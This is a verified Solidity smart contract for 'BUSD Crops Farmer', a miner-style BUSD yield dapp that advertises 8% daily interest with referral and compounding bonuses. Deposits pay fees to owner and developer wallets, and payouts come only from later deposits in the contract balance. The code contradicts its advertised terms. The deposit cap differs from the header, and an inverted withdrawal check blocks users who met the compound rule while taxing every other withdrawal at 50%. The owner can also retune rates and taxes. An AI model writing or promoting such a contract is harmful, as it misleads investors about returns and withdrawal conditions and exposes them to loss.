/**
 *Submitted for verification at BscScan.com on 2022-04-09
*/

/**

BUSD Crops Farmer
Hire Farmers, Earn Crops, Sell Crops for BUSD.
  ~ 8% daily interest contract basis.
  ~ 5% Referral Bonus, rewards wil go straight to the wallet.
  ~ 4% stacking compound bonus every 24 hrs, max of 6 days.
  ~ 48 hours cut off time.
  ~ 20 BUSD minimum investment.
  ~ 20,000 BUSD max deposits per wallet.
  ~ 50% feedback for withdrawals that will be done not after 6 consecutive compounds.
  ~ Withdrawals will reset daily compound count back to 0.
    *Tax will stay in the contract.
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract BusdCrops {
    using SafeMath for uint256;

    IERC20 public token_BUSD;
	address erctoken = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7; /** BUSD Testnet **/
    //address erctoken = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; /** BUSD Mainnet **/
    
    /** base parameters **/
    uint256 public EGGS_TO_HIRE_1MINERS = 1080000; /** 8% **/
    uint256 public EGGS_TO_HIRE_1MINERS_COMPOUND = 1080000; /** 8% **/
    uint256 public REFERRAL = 50;
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public DEV = 20;
    uint256 public MKT = 10; // seperate param to modify marketing fee moving forward.
    uint256 public MARKET_EGGS_DIVISOR = 2;

    /** investment limit parameters **/
    uint256 public MIN_INVEST_LIMIT = 20 * 1e18; /** 20 BUSD  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 10000 * 1e18; /** 10000 BUSD  **/

    /** bonus parameters **/
	uint256 public COMPOUND_BONUS = 40; /** 4% **/
	uint256 public COMPOUND_BONUS_MAX_TIMES = 6; /** 6 times / 6 days. **/
    uint256 public COMPOUND_STEP = 24 * 60 * 60; /** every 24 hours. **/

    /** withdrawal tax parameters **/
    uint256 public WITHDRAWAL_TAX = 500;
    uint256 public MANDATORY_COMPOUND_FOR_WITHDRAWAL = 6;

    /* statistics parameters */
    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;

    /* miner parameters */
    uint256 public marketEggs;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool public contractStarted;

    /** cooldown parameters **/
	uint256 public CUTOFF_STEP = 48 * 60 * 60; /** 48 hours  **/
	uint256 public WITHDRAW_COOLDOWN = 12 * 60 * 60; /** 12 hours  **/

    /* addresses */
    address public owner;
    address public dev1;
    address public dev2;
    address public mkt;

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners;
        uint256 claimedEggs;
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
        uint256 lastWithdrawTime;
    }

    mapping(address => User) public users;

    constructor(address _owner, address _dev1, address _dev2, address _mkt) {
		require(!isContract(_owner) && !isContract(_dev1) && !isContract(_dev2) && !isContract(_mkt));
        owner = _owner;
        dev1 = _dev1;
        dev2 = _dev2;
        mkt = _mkt;
        token_BUSD = IERC20(erctoken);
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function hatchEggs(bool isCompound) public {
        User storage user = users[msg.sender];
        require(contractStarted, "Contract not yet Started.");

        uint256 eggsUsed = getMyEggs();
        uint256 eggsForCompound = eggsUsed;

        /** isCompound -- only true when compounding. **/
        if(isCompound) {
            uint256 dailyCompoundBonus = getDailyCompoundBonus(msg.sender, eggsForCompound);
            eggsForCompound = eggsForCompound.add(dailyCompoundBonus);
            uint256 eggsUsedValue = calculateEggSell(eggsForCompound);
            user.userDeposit = user.userDeposit.add(eggsUsedValue);
            totalCompound = totalCompound.add(eggsUsedValue);
        } 

        /** compounding bonus add count if greater than COMPOUND_STEP. **/
        if(block.timestamp.sub(user.lastHatch) >= COMPOUND_STEP) {
            if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
                user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
            }
        }
        
        user.miners = user.miners.add(eggsForCompound.div(EGGS_TO_HIRE_1MINERS));
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;

    /** lower the increase of marketEggs value for every compound/deposit, this will make the inflation slower.  20%(5) to 8%(12). **/
        marketEggs = marketEggs.add(eggsUsed.div(MARKET_EGGS_DIVISOR));
    }

    function sellEggs() public{
        require(contractStarted);
        User storage user = users[msg.sender];
        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);

        /** mandatory compound days before withdraw **/
        if(user.dailyCompoundBonus == MANDATORY_COMPOUND_FOR_WITHDRAWAL) revert("Mandatory compound days before withdraw not met.");
        
        /** reset claim. **/
        user.claimedEggs = 0;
        
        /** reset hatch time. **/      
        user.lastHatch = block.timestamp;
        
        /** reset daily compound bonus if compound bonus = mandatory compound for withdrawal. **/
        if(user.dailyCompoundBonus == MANDATORY_COMPOUND_FOR_WITHDRAWAL){
            user.dailyCompoundBonus = 0;
        }
        
        /** 
            if user compound != to mandatory compound days**/
        if(user.dailyCompoundBonus != MANDATORY_COMPOUND_FOR_WITHDRAWAL){
          eggValue = eggValue.sub(eggValue.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
        }
        
        /** set last withdrawal time **/
        user.lastWithdrawTime = block.timestamp;

        /** lowering the amount of eggs that is being added to the total eggs supply to only 5% for each sell **/
        marketEggs = marketEggs.add(hasEggs);
        
        /** check if contract has enough funds to pay -- one last ride. **/
        if(getBalance() < eggValue) {
            eggValue = getBalance();
        }

        uint256 eggsPayout = eggValue.sub(payFees(eggValue));
        token_BUSD.transfer(msg.sender, eggsPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
        totalWithdrawn = totalWithdrawn.add(eggsPayout);
    }

    function buyEggs(address ref, uint256 amount) public{
        User storage user = users[msg.sender];
        if (!contractStarted) {
    		if (msg.sender == owner) {
    		    require(marketEggs == 0);
    			contractStarted = true;
                marketEggs = 864000000000;
    		} else revert("Contract not yet started.");
    	}
        require(amount >= MIN_INVEST_LIMIT, "Mininum investment not met.");
        require(user.initialDeposit.add(amount) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
        
        token_BUSD.transferFrom(address(msg.sender), address(this), amount);
        uint256 eggsBought = calculateEggBuy(amount, getBalance().sub(amount));
        user.userDeposit = user.userDeposit.add(amount);
        user.initialDeposit = user.initialDeposit.add(amount);
        user.claimedEggs = user.claimedEggs.add(eggsBought);

        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }
                
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                uint256 refRewards = amount.mul(REFERRAL).div(PERCENTS_DIVIDER);
                token_BUSD.transfer(upline, refRewards);
                users[upline].referralEggRewards = users[upline].referralEggRewards.add(refRewards);
                totalRefBonus = totalRefBonus.add(refRewards);
            }
        }

        uint256 eggsPayout = payFees(amount);
        /** less the fee on total Staked to give more transparency of data. **/
        totalStaked = totalStaked.add(amount.sub(eggsPayout));
        totalDeposits = totalDeposits.add(1);
        hatchEggs(false);
    }

    function payFees(uint256 eggValue) internal returns(uint256){
        uint256 development = eggValue.mul(DEV).div(PERCENTS_DIVIDER);
        uint256 marketing = eggValue.mul(MKT).div(PERCENTS_DIVIDER);
        token_BUSD.transfer(owner, development);
        token_BUSD.transfer(dev1, development);
        token_BUSD.transfer(dev2, development);
        token_BUSD.transfer(mkt, marketing);
        return marketing.add(development);
    }

    function getDailyCompoundBonus(address _adr, uint256 amount) public view returns(uint256){
        if(users[_adr].dailyCompoundBonus == 0) {
            return 0;
        } else {
            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(COMPOUND_BONUS); 
            uint256 result = amount.mul(totalBonus).div(PERCENTS_DIVIDER);
            return result;
        }
    }

    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
     uint256 _claimedEggs, uint256 _lastHatch, address _referrer, uint256 _referrals,
	 uint256 _totalWithdrawn, uint256 _referralEggRewards, uint256 _dailyCompoundBonus, uint256 _lastWithdrawTime) {
         _initialDeposit = users[_adr].initialDeposit;
         _userDeposit = users[_adr].userDeposit;
         _miners = users[_adr].miners;
         _claimedEggs = users[_adr].claimedEggs;
         _lastHatch = users[_adr].lastHatch;
         _referrer = users[_adr].referrer;
         _referrals = users[_adr].referralsCount;
         _totalWithdrawn = users[_adr].totalWithdrawn;
         _referralEggRewards = users[_adr].referralEggRewards;
         _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
         _lastWithdrawTime = users[_adr].lastWithdrawTime;
	}

    function getBalance() public view returns (uint256) {
        return token_BUSD.balanceOf(address(this));
	}

    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = users[_adr].claimedEggs.add(getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }

    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return SafeMath.div(SafeMath.mul(PSN, bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs), SafeMath.mul(PSNH, rt)), rt)));
    }

    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs, marketEggs, getBalance());
    }

    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketEggs);
    }

    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth, getBalance());
    }

    function getEggsYield(uint256 amount) public view returns(uint256,uint256) {
        uint256 eggsAmount = calculateEggBuy(amount , getBalance().add(amount).sub(amount));
        uint256 miners = eggsAmount.div(EGGS_TO_HIRE_1MINERS);
        uint256 day = 1 days;
        uint256 eggsPerDay = day.mul(miners);
        uint256 earningsPerDay = calculateEggSellForYield(eggsPerDay, amount);
        return(miners, earningsPerDay);
    }

    function calculateEggSellForYield(uint256 eggs,uint256 amount) public view returns(uint256){
        return calculateTrade(eggs,marketEggs, getBalance().add(amount));
    }

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus);
    }

    function getMyMiners() public view returns(uint256){
        return users[msg.sender].miners;
    }

    function getMyEggs() public view returns(uint256){
        return users[msg.sender].claimedEggs.add(getEggsSinceLastHatch(msg.sender));
    }

    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
                            /** get min time. **/
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 secondsPassed = min(EGGS_TO_HIRE_1MINERS, cutoffTime);
        return secondsPassed.mul(users[adr].miners);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    /** wallet addresses setters **/
    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = value;
    }

    function CHANGE_DEV1(address value) external {
        require(msg.sender == dev1, "Admin use only.");
        dev1 = value;
    }

    function CHANGE_DEV2(address value) external {
        require(msg.sender == dev2, "Admin use only.");
        dev2 = value;
    }

    function CHANGE_MKT_WALLET(address value) external {
        require(msg.sender == owner || msg.sender == dev1, "Admin use only.");
        mkt = value;
    }

    /** percentage setters **/

    // 2592000 - 3%, 2160000 - 4%, 1728000 - 5%, 1440000 - 6%, 1200000 - 7%, 1080000 - 8%
    // 959000 - 9%, 864000 - 10%, 720000 - 12%, 575424 - 15%, 540000 - 16%, 479520 - 18%
    
    function PRC_EGGS_TO_HIRE_1MINERS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 479520 && value <= 2592000); /** min 3% max 12%**/
        EGGS_TO_HIRE_1MINERS = value;
    }

    function PRC_EGGS_TO_HIRE_1MINERS_COMPOUND(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 479520 && value <= 2592000); /** min 3% max 12%**/
        EGGS_TO_HIRE_1MINERS_COMPOUND = value;
    }

    function PRC_MKT(uint256 value) external {
        require(msg.sender == owner || msg.sender == dev1, "Admin use only.");
        require(value >= 10 && value <= 50); /** 5% max **/
        MKT = value;
    }

    function PRC_DEV(uint256 value) external {
        require(msg.sender == owner || msg.sender == dev1, "Admin use only.");
        require(value <= 50); /** 5% max **/
        DEV = value;
    }

    function PRC_REFERRAL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100); /** 10% max **/
        REFERRAL = value;
    }

    function PRC_MARKET_EGGS_DIVISOR(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 50); /** 50 = 2% **/
        MARKET_EGGS_DIVISOR = value;
    }

    /** withdrawal tax **/
    function SET_WITHDRAWAL_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 500); /** Max Tax is 50% or lower **/
        WITHDRAWAL_TAX = value;
    }

    /** bonus **/
    function BONUS_DAILY_COMPOUND(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 900); /** 90% max **/
        COMPOUND_BONUS = value;
    }

    function BONUS_DAILY_COMPOUND_BONUS_MAX_TIMES(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 30); /** 30 max **/
        COMPOUND_BONUS_MAX_TIMES = value;
    }

    function BONUS_COMPOUND_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
         /** hour conversion **/
        COMPOUND_STEP = value * 60 * 60;
    }

    function SET_MIN_INVEST_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        MIN_INVEST_LIMIT = value * 1e18;
    }

    function SET_CUTOFF_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        CUTOFF_STEP = value * 60 * 60;
    }

    function SET_WITHDRAW_COOLDOWN(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value <= 24);
        WITHDRAW_COOLDOWN = value * 60 * 60;
    }

    function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 20);
        WALLET_DEPOSIT_LIMIT = value * 1e18;
    }
}


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}